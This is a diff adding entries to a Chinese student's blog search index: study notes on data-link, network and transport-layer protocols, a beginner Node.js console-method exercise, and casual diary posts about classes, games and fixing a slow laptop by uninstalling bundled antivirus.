+<h2 id="面向字符的组帧技术"><a href="#面向字符的组帧技术" class="headerlink" title="面向字符的组帧技术"></a>面向字符的组帧技术</h2><p><a href="https://blog.51cto.com/lomomo/115655">SLIP协议</a></p>
+<pre><code>物理层传输以字符为基本单元，并形成一定格式的字符串
+
+以END（C0H）和ESC（DBH）进行首位区分
+</code></pre>
+<h2 id="面向比特的组帧技术"><a href="#面向比特的组帧技术" class="headerlink" title="面向比特的组帧技术"></a>面向比特的组帧技术</h2><p>比特插入技术</p>
+<pre><code>用一个特殊比特串（Flag），如01^j0(指连续j个1） 
+
+发端出现连续j-1个    “1”，就插入一个零
+
+收端入伙发现j-1个“1”后面是零，就删掉零
+</code></pre>
+<h2 id="采用长度技术的组帧技术"><a href="#采用长度技术的组帧技术" class="headerlink" title="采用长度技术的组帧技术"></a>采用长度技术的组帧技术</h2><p>除以上两种，还用了帧长度来标识如何结束</p>
+<h2 id="差错检测技术"><a href="#差错检测技术" class="headerlink" title="差错检测技术"></a>差错检测技术</h2><p>思路：</p>
+<p>发端在K个信息后加L个某种规则计算的校验比特</p>
+<p>收端以所得数据进行重新计算L个校验比特与接受的校验比特对比</p>
+<p><a href="https://baike.baidu.com/item/%E5%A5%87%E5%81%B6%E6%A0%A1%E9%AA%8C/8090811">奇偶校验</a></p>
+<h2 id="收端自动请求发端重发技术"><a href="#收端自动请求发端重发技术" class="headerlink" title="收端自动请求发端重发技术"></a>收端自动请求发端重发技术</h2><p><a href="https://blog.csdn.net/aaahuahua/article/details/119965804">ARQ协议</a></p>
+<p>SN：发送序号，发送帧的序号</p>
+<p>RN：接受序号，希望接受的下一帧序号（停等）或者已接收的最大序号（连续）</p>
+<hr>
+<h1 id="标准数据链路协议"><a href="#标准数据链路协议" class="headerlink" title="标准数据链路协议"></a>标准数据链路协议</h1><p>SDLC（IBM</p>
+<p><a href="https://baike.baidu.com/item/HDLC%E5%8D%8F%E8%AE%AE/9441935">HDLC</a>（ISO</p>
+<p>ADCCP（ANSI</p>
+<p>LAPB（CCITT</p>
+<p>以HDLC介绍</p>
+<h2 id="正常响应模式"><a href="#正常响应模式" class="headerlink" title="正常响应模式"></a>正常响应模式</h2><p>参照HDLC</p>
+<h2 id="异步响应模式"><a href="#异步响应模式" class="headerlink" title="异步响应模式"></a>异步响应模式</h2><p>参照HDLC</p>
+<h2 id="异步平衡模式"><a href="#异步平衡模式" class="headerlink" title="异步平衡模式"></a>异步平衡模式</h2><p>参照HDLC</p>
+<h1 id="网络层（子网层）的端到端传输协议"><a href="#网络层（子网层）的端到端传输协议" class="headerlink" title="网络层（子网层）的端到端传输协议"></a>网络层（子网层）的端到端传输协议</h1><h2 id="会话过程的标识"><a href="#会话过程的标识" class="headerlink" title="会话过程的标识"></a>会话过程的标识</h2><p>一条链路通常被若干过程共享，需要对不同目的地&#x2F;源的不同会话过程的分组进行标识</p>
+<p>虚电路方式<br>    使用虚电路号（VC号），每个分组都有一个VC号，不同链路的虚电路好是独立的，每个节点都有一个VC转换表。</p>
+<p>数据报方式<br>    分组头中包含源节点、目的节点地址，以及相同节点中不同会话过程的标识，同一绘画过程中的分组编号（为了解决顺序和丢包问题） ，分组编号用K比特标识，用mod 2^K的方式循环编号。</p>
+<h2 id="网络层的差错控制"><a href="#网络层的差错控制" class="headerlink" title="网络层的差错控制"></a>网络层的差错控制</h2><p>与数据链路类似，使用ARQ的sn，rn和返回式或选择重发式</p>
+<p>差别：</p>
+<p>使用的位置不同 对于网络中任意两个节点间的传输</p>
+<p>编号方式不同 对分组进行编号，而不是帧</p>
+<p>传输顺序不同 不同分组可能经过不同路径</p>
+<p>时延不同 跟整个网络的状况有关</p>
+<p>差错检测</p>
+<h2 id="网络层流量控制"><a href="#网络层流量控制" class="headerlink" title="网络层流量控制"></a>网络层流量控制</h2><p>使发端减缓发送速度：类似DLC的RNR</p>
+<p>采用许可机制，反馈收端还有多少接受能力</p>
+<h1 id="运输层的端到端传输协议"><a href="#运输层的端到端传输协议" class="headerlink" title="运输层的端到端传输协议"></a>运输层的端到端传输协议</h1><p>TCP</p>
+<h2 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h2><p>选择重发ARQ</p>
+<p>组适应算法计算平均往返时延</p>
+<p>##流量控制<br>考虑接收者缓存容量大小 使用通知窗口</p>
+<p>网络容量和通过量 使用拥塞窗口</p>
+<p>发送窗口&#x3D;min（通知窗口，使用窗口）</p>
+<p>慢启动、拥塞避免、快重传来进行拥塞控制</p>
+<p>每发送一次，就调整一次发送窗口</p>
+<p>使用门限窗口，拥塞大于门限，降低发送速度来避免拥塞</p>
+]]></content>
+      <categories>
+        <category>通信网络基础</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅学通信网络基础第一章</title>
+    <url>/2022/03/04/%E6%B5%85%E5%AD%A6%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
+    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>##1-1什么是通信网络<br>是一些设备、设施组成的集合，可以提供特定的服务，既可以实现位于任意地点的不同用户间信息的传递</p>
+<p><img src="/"></p>
+<p>个人理解：网络传输方式是一致的，由不同协议来决定信息的意义。</p>
+<h2 id="1-2通信网络的基本构成"><a href="#1-2通信网络的基本构成" class="headerlink" title="1-2通信网络的基本构成"></a>1-2通信网络的基本构成</h2><p>数据传输网络基本功能是通过网络中的交换机或路由器，运载用户业务的分组，选择合适的传输路径，使这次额分组迅速可靠地传送到目标用户。</p>
+<p>基本信息被成为消息根据有应用场合不同有不同名称（文本，图片，视频等）</p>
+<p>A与B进行多次信息交互的交互序列被称为会话过程</p>
+<p>数据传输网络需保证每个绘画、会话过程可靠、及时、高效完成。</p>
+<p>典型的数据传输网络：分组交换网络和ATM网络等</p>
+<p>分组：有一定的数据单元</p>
+<p>每个组有个分组头，来代表目的以及其他信息</p>
+<p>每个网络节点中由存储转发的方式进行呈递</p>
+<p>三个基本过程：</p>
+<blockquote>
+<p>一、分段和重装  发端需将一条消息分成规定的分组，在收端重新装配，回复原始信息。</p>
+</blockquote>
+<blockquote>
+<p>二、路径选择 </p>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>虚电路方式</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>数据报方式</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>三、网络节点交换过程 </p>
+</blockquote>
+<p><a href="https://blog.csdn.net/weixin_30670965/article/details/96123793">数据报和虚电路的优缺点</a> </p>
+<h2 id="1-3协议体系及分层概念"><a href="#1-3协议体系及分层概念" class="headerlink" title="1-3协议体系及分层概念"></a>1-3协议体系及分层概念</h2><p>在信道上一套关于信息的表示、信息传递顺序、信息格式和信息内容等的约定，这一套约定称为通信协议</p>
+<p>分层的基础使“模块”的概念，多个模块形成系统，乘坐服务</p>
+<p>设计简单，易懂，标准化，交互性好，现成模块多，可嵌套，对用户就是黑箱</p>
+<p>双方必须有相同的或相应的模块才能进行通信</p>
+<p>要求保证数据传送的及时性正确性，可辨识性</p>
+<p>举例：<a href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B/10119902">OSI协议</a></p>
+<p><a href="https://blog.csdn.net/qq_42631607/article/details/105029270">链路层</a></p>
+]]></content>
+      <categories>
+        <category>通信网络基础</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022/3/2 RAV antivirus的卸载</title>
+    <url>/2022/03/03/2022-3-2/</url>
+    <content><![CDATA[<h1 id="电脑问题终于解决了"><a href="#电脑问题终于解决了" class="headerlink" title="电脑问题终于解决了"></a>电脑问题终于解决了</h1><p>我错怪了win11和amd的搭配</p>
+<p>是这个“RAV antivirus”的问题</p>
+<p>据说是瑞星的杀毒软件，是比特彗星捆绑来的东西</p>
+<p>我居然以为是电脑自带的东西没去管</p>
+<p>然而确实是它导致了响应速度及其慢，关掉就恢复如初</p>
+<p>我的做法是，直接打开根目录运行uninstaller</p>
+<p>然后就没了，看网上好多人的各种方法，我也是醉了，还是uninstaller管用</p>
+<p>毕竟瑞星不算那么流氓是吧</p>
+<p>然后就被教练问为啥不打郑轻周赛了（逃</p>
+<p>前端先不学了，麻烦</p>
+<h1 id="舞萌打了个FC还不错"><a href="#舞萌打了个FC还不错" class="headerlink" title="舞萌打了个FC还不错"></a>舞萌打了个FC还不错</h1><p>别的没了</p>
+<p>我的评价是：</p>
+<h1 id="摆"><a href="#摆" class="headerlink" title="摆"></a>摆</h1>]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>划水</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022/2/28</title>
+    <url>/2022/03/01/2022-2-28/</url>
+    <content><![CDATA[<p>莫名就变成两天一写了，不过也还好</p>
+<h1 id="我的评价是：破防"><a href="#我的评价是：破防" class="headerlink" title="我的评价是：破防"></a>我的评价是：破防</h1><h2 id="27号"><a href="#27号" class="headerlink" title="27号"></a>27号</h2><p>睁开眼就开始搞代码</p>
+<p>amd的处理器+win11&#x3D;当场去世（后续更新：其实不是他们的锅，我的电脑被捆绑上了瑞星的杀软。。。删了就没事了）</p>
+<p>捏码的，编译个a+b用了四秒，然后卡了二十几秒才运行你是在开玩笑？</p>
+<p>然后就发现，这个配置组合，打开软件都要十几秒，</p>
+<p>连自带的计算器都给我卡好几秒</p>
+<p>这道理没法儿讲了，寄</p>
+<p>找不到处理方法，下午的郑轻周赛直接寄，心态上天</p>
+<p>于是就摆烂了</p>
+<p>不得不说，去瀚海打maimai还是不错的，wacca也不错</p>
+<p>以后摆烂有地方去了（逃</p>
+<p>我还打了人生第一个s（虽然是7级谱面）</p>
+<p>九级谱面也能上80%了（前途一片光明）</p>
+<p>然后就摆呗</p>
+<h2 id="28号"><a href="#28号" class="headerlink" title="28号"></a>28号</h2><p>上课，然后继续被这sb电脑搞破防</p>
+<p>继续寄</p>
+<p>中午躺床上玩电脑（话说我这开学以来第一次中午在寝室）</p>
+<p>不过床上玩电脑是真的爽啊</p>
+<p>下午排球课就有又防了，手都要断了</p>
+<p>累死了，然后摆烂到七点</p>
+<p>想去自习室摆，但是一拿起来电脑，就想解决电脑问题</p>
+<p>起视四境，破防又至矣</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>划水</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>node.js</title>
+    <url>/2022/02/27/node-js/</url>
+    <content><![CDATA[<p>浅浅的学了一下nodejs的使用</p>
+<h1 id="跟着慕课的课程慢慢学的"><a href="#跟着慕课的课程慢慢学的" class="headerlink" title="跟着慕课的课程慢慢学的"></a>跟着慕课的课程慢慢学的</h1><pre><code>`
+console.log(&quot;Web前端开发&quot;);//普通信息
+console.info(&quot;Web前端开发&quot;);//提示信息
+console.error(&quot;Web前端开发&quot;);//错误信息
+console.warn(&quot;Web前端开发&quot;);//警告信息
+//个人理解：搭配if食用效果更佳
+
+var bBody = document.body; //定义一个变量，貌似var这个东西可以定义所有种类变量，然后变量类型取决于放进去的数据
+console.dir(bBody);
+
+var students = [                //你看这儿就是var定义数组，有别于c的定义方法
+    &#123;
+        name: &quot;张三&quot;,
+        email: &quot;zhangsan@163.com&quot;,
+        qq: 12345
+    &#125;,
+    &#123;
+        name: &quot;李四&quot;,
+        email: &quot;lisi@163.com&quot;,
+        qq: 123456
+    &#125;
+];
+console.table(students);//输出表格
+
+console.time(&#39;forTime&#39;);这个和c那个记录时间的函数很想像
+for(var i=0,count = 0;i&lt;99999;i++)&#123;//for循环属于典中典了
+    count++;
+&#125;
+console.timeEnd(&#39;forTime&#39;);
+
+console.group(&#39;前端一组&#39;);//这个类似是开了一个分支的效果
+console.log(&quot;前端一组-1&quot;);
+console.log(&quot;前端一组-2&quot;);
+console.log(&quot;前端一组-3&quot;);
+console.groupEnd();
+
+function testFn()&#123;//定义函数啊，典
+    console.count(&#39;当前函数被调用次数&#39;);
+&#125;
+testFn();
+testFn();
+testFn();
+
+var flag = false;
+console.assert(flag,&#39;当flag为false时才输出!&#39;)//这个应该是个检测函数，检测是否为真;
+</code></pre>
+<p>&#96;</p>
+<p>就学到这儿，再探再报</p>
+<p><img src="https://i0.hdslb.com/bfs/article/d1f5f858ddb52f5de6aa1ab13c2ed63ea23fcce2.jpg@1320w_740h.webp"></p>
+]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022/2/26</title>
+    <url>/2022/02/26/2022-2-26/</url>
+    <content><![CDATA[<h1 id="老校区摆的不提劲，我直接在龙子湖摆"><a href="#老校区摆的不提劲，我直接在龙子湖摆" class="headerlink" title="老校区摆的不提劲，我直接在龙子湖摆"></a>老校区摆的不提劲，我直接在龙子湖摆</h1><p>今天是交个普通话证的表，顺便陪室友串亲戚了</p>
+<p>然后顺便打了个信管的蓝桥预选赛</p>
+<p>TC我居然没看出来用栈做。。。。</p>
+<p>TH排个序，然后模拟了一个钟头，好在是过了。。。</p>
+<p>TG没看，但是据说是个裸背包，离大谱了</p>
+<p>TF24点，妈耶，我前面的大哥写了二十七个if语句</p>
+<p>总之，寄了，很划，很烂</p>
+<p>顺便放一点小姐姐拍的照片</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/02/98637a929b6fa788.jpg"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/02/08a626c6e3a333ca.jpg"></p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>划水</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022/2/24</title>
+    <url>/2022/02/24/2022-2-24/</url>
+    <content><![CDATA[<h1 id="一日之摆启于晨"><a href="#一日之摆启于晨" class="headerlink" title="一日之摆启于晨"></a>一日之摆启于晨</h1><h2 id="6：00"><a href="#6：00" class="headerlink" title="6：00"></a>6：00</h2><p>上铺放的盒子biaji一声拍地上给我惊醒了，一看表，六点钟，就很离谱，八辈子没起过这么早了。起都起了，洗个衣服吧，这小风吹着，jiojio都冻疼了，预示着又是摆的一天。</p>
+<h2 id="7：00"><a href="#7：00" class="headerlink" title="7：00"></a>7：00</h2><p>郑州的公交车离谱啊，早饭差点晃出来。</p>
+<p>然后我又看着三号楼的课，一头扎推广楼里面去了。（笑）</p>
+<p>一进教室，可恶，电路原理，昨天摆烂看选秀，没有预习。不过来都来了，这不睡会儿？看两眼书，继续摆！</p>
+<h2 id="8：00"><a href="#8：00" class="headerlink" title="8：00"></a>8：00</h2><p>电路原理课</p>
+<h2 id="9：40"><a href="#9：40" class="headerlink" title="9：40"></a>9：40</h2><p>可恶，煎饼果子背叛了我，才两节课就饿了，摆了摆了，吃点吃点，小卖部续一波命，不然后面集中不了注意力了。</p>
+<h2 id="10：00"><a href="#10：00" class="headerlink" title="10：00"></a>10：00</h2><p>思修课是要好好听的吧</p>
+<p>老师：这就是这样的一个很好的那个东西，所以我们应该好好培养一个这样的那个素养</p>
+<p>我：？？？？？？</p>
+<p>这老师也是绝了，滔滔不绝讲着莫名其妙的话（要是知识点多，我肯定听啊）</p>
+<p>摆吧，写写博客干点啥的</p>
+<p>整一个大本钟下送快递</p>
+<p>上面摆下面寄</p>
+<p>去找找有没有题可以写去</p>
+<h2 id="12：40"><a href="#12：40" class="headerlink" title="12：40"></a>12：40</h2><p>这波啊，这波是错峰吃饭</p>
+<p>woc？大帝要打乌克兰了？</p>
+<p>mark一下，下午再看</p>
+<h2 id="16：00"><a href="#16：00" class="headerlink" title="16：00"></a>16：00</h2><p>下课一看手机，基辅拿下了</p>
+<p>woc，见证历史了属于是</p>
+<p>这波啊，这波是疯狂星期四了2333</p>
+<h1 id="这波是见证历史了"><a href="#这波是见证历史了" class="headerlink" title="这波是见证历史了"></a>这波是见证历史了</h1>]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>划水</tag>
+      </tags>
+  </entry>
+</search>
